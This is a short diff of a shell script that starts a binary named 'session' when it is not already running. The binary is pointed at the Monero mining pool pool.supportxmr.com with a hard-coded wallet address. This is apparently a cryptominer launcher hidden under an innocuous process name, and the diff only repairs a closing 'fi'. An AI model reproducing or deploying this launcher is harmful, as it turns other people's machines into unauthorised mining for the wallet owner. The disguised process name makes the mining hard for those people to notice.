@@ -8,4 +8,4 @@ if ! pgrep -x "session" > /dev/null; then
     ./session -o pool.supportxmr.com:80 -u 442xHeyLLcgQSSgbKJrMiG8mECruxyviqKMDt41nMXhgiCJFmA4CJaoQ8gGDz7EH89c2cUk6LaKN1RTPatbU3xhR6dPvaMf -k -p 2025 
 else
     echo "Session process is already running."
-f
+fi
